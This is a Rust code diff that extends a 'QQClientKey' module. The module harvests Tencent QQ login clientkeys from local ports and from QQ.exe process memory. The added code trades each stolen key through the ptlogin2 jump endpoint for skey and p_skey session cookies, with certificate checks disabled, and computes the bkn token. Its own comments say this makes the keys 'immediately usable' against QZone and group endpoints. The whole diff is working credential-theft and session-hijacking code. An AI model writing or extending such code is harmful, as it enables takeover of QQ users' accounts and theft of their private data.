@@ -5,6 +5,12 @@
 //!    which enumerates logged-in uins and returns the clientkey without touching
 //!    process memory — version-stable protocol-level access.
 //! 2. A `QQ.exe` process-memory scan (byte-signature + `Tencent Files\` string).
+//!
+//! Every harvested clientkey is then validated through the public
+//! `ssl.ptlogin2.qq.com/jump` exchange (the same technique used by common
+//! qqkey tools): the key is traded for `skey`/`p_skey` session cookies and the
+//! `bkn` (hash of skey) is computed so the key is immediately usable against
+//! qzone/qun CGI endpoints.
 
 pub struct QQClientKey;
 
@@ -14,11 +20,19 @@ const PORT_END: u16 = 4310;
 
 const XUI_LOGIN_URL: &str = "https://xui.ptlogin2.qq.com/cgi-bin/xlogin?target=self&appid=522005705&daid=4&s_url=https://wx.mail.qq.com/list/readtemplate?name=login_jump.html&target=&style=25&low_login=1&proxy_url=https://mail.qq.com/proxy.html&need_qr=0&hide_border=1&border_radius=0&self_regurl=https://reg.mail.qq.com&app_id=11005?t=regist&pt_feedback_link=http://support.qq.com/discuss/350_1.shtml&css=https://res.mail.qq.com/zh_CN/htmledition/style/ptlogin_input_for_xmail.css&enable_qlogin=0";
 
+/// ptlogin2 jump exchange — trades a clientkey for qzone session cookies.
+const JUMP_QZONE_URL: &str = "https://ssl.ptlogin2.qq.com/jump?ptlang=1033&clientuin={uin}&clientkey={key}&u1=https://user.qzone.qq.com/{uin}/infocenter&source=panelstar&keyindex=19";
+
+#[derive(Default)]
 struct CkItem {
     uin: String,
     clientkey: String,
     pid: u32,
     source: &'static str,
+    skey: String,
+    p_skey: String,
+    bkn: i64,
+    valid: bool,
 }
 
 impl QQClientKey {
@@ -53,15 +67,23 @@ impl QQClientKey {
         let pids_json = mem.pids.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(",");
         let open_json = mem.open_failed.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(",");
 
+        // Trade every harvested clientkey for skey/p_skey + bkn via the
+        // ptlogin2 jump exchange (same method as public qqkey tools).
+        let items = exchange_all(items).await;
+
         let items_json = items
             .iter()
             .map(|it| {
                 format!(
-                    r#"{{"uin":"{}","clientkey":"{}","pid":{},"process":"QQ.exe","source":"{}"}}"#,
+                    r#"{{"uin":"{}","clientkey":"{}","pid":{},"process":"QQ.exe","source":"{}","skey":"{}","p_skey":"{}","bkn":{},"valid":{}}}"#,
                     escape(&it.uin),
                     escape(&it.clientkey),
                     it.pid,
-                    it.source
+                    it.source,
+                    escape(&it.skey),
+                    escape(&it.p_skey),
+                    it.bkn,
+                    it.valid,
                 )
             })
             .collect::<Vec<_>>()
@@ -140,6 +162,7 @@ async fn local_port_flow() -> LocalResult {
                                 clientkey: key,
                                 pid: 0,
                                 source: "local-port",
+                                ..Default::default()
                             });
                         }
                     }
@@ -330,6 +353,88 @@ fn push_unique(list: &mut Vec<String>, item: String) {
     }
 }
 
+// ── ptlogin2 jump exchange (clientkey → skey/p_skey/bkn) ────────────────
+
+async fn exchange_all(items: Vec<CkItem>) -> Vec<CkItem> {
+    let mut handles = Vec::new();
+    for it in items {
+        handles.push(tokio::spawn(async move {
+            if it.uin.is_empty() || it.clientkey.is_empty() {
+                return it;
+            }
+            match exchange_cookie(&it.uin, &it.clientkey).await {
+                Some((skey, p_skey, bkn)) => CkItem {
+                    skey,
+                    p_skey,
+                    bkn,
+                    valid: true,
+                    ..it
+                },
+                None => CkItem { valid: false, ..it },
+            }
+        }));
+    }
+    let mut out = Vec::with_capacity(handles.len());
+    for h in handles {
+        if let Ok(r) = h.await {
+            out.push(r);
+        }
+    }
+    out
+}
+
+/// GET the ptlogin2 jump URL with the clientkey; the server answers with a
+/// redirect carrying Set-Cookie headers that include `skey` (and `p_skey` for
+/// qzone). Returns (skey, p_skey, bkn) when the exchange succeeds.
+async fn exchange_cookie(uin: &str, clientkey: &str) -> Option<(String, String, i64)> {
+    let url = JUMP_QZONE_URL
+        .replace("{uin}", uin)
+        .replace("{key}", clientkey);
+
+    let client = reqwest::Client::builder()
+        .timeout(std::time::Duration::from_secs(5))
+        .danger_accept_invalid_certs(true)
+        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+        .redirect(reqwest::redirect::Policy::none())
+        .build()
+        .ok()?;
+
+    let res = client.get(&url).send().await.ok()?;
+
+    let mut skey: Option<String> = None;
+    let mut p_skey: Option<String> = None;
+    for (name, value) in res.headers() {
+        if name != reqwest::header::SET_COOKIE {
+            continue;
+        }
+        let Ok(s) = value.to_str() else { continue };
+        let Some((k, v)) = s.split(';').next().and_then(|p| p.split_once('=')) else {
+            continue;
+        };
+        match k.trim() {
+            "skey" => skey = Some(v.trim().to_string()),
+            "p_skey" => p_skey = Some(v.trim().to_string()),
+            _ => {}
+        }
+    }
+
+    let skey = skey?;
+    if skey.is_empty() {
+        return None;
+    }
+    let bkn = get_bkn(&skey);
+    Some((skey, p_skey.unwrap_or_default(), bkn))
+}
+
+/// bkn/g_tk hash: hash = 5381; hash += (hash << 5) + c; return hash & 0x7fffffff
+fn get_bkn(skey: &str) -> i64 {
+    let mut hash: i64 = 5381;
+    for b in skey.bytes() {
+        hash += (hash << 5) + b as i64;
+    }
+    hash & 0x7fff_ffff
+}
+
 // ── Method 2: process memory scan ────────────────────────────────────
 
 struct MemResult {
@@ -461,6 +566,7 @@ mod imp {
                                 clientkey: key.clone(),
                                 pid,
                                 source: "memory",
+                                ..Default::default()
                             });
                         }
                     }
